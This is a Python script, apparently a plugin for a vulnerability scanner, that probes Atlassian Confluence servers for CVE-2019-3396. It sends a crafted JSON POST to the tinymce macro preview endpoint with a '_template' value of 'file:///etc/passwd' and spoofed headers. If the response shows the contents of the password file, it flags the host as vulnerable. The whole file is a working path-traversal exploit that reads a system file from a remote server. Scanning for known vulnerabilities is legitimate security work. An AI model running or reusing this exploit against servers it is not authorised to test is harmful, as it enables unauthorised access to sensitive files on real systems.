#!/usr/bin/env python
# _*_ coding: utf-8 _*_
import urllib
import logging
import requests


def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

PayloadPost='''{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}'''
Payload="/rest/tinymce/1/macro/preview"
def CVE_2019_3396(Url,RandomAgent):
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    PayloadUrl = scheme+"://"+url+':'+str(port)+Payload
    Referers = scheme + "://" + url + ':' + str(port)
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept': 'text/plain, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'User-Agent': RandomAgent,
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json; charset=utf-8',
        'Referer': Referers,
        'Content-Length': '167',
        'X-Forwarded-For': '127.0.0.2',
        'Connection': 'keep-alive'

    }
    s = requests.session()
    try:
        resp = s.post(PayloadUrl,data=PayloadPost,headers=headers, timeout=5)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('bin')!=-1 and con.lower().find('root')!=-1 :
            Medusa = "{} 存在AtlassianConfluence路径穿越与命令执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, PayloadUrl,PayloadPost)
            return(Medusa)
    except Exception as e:
        pass
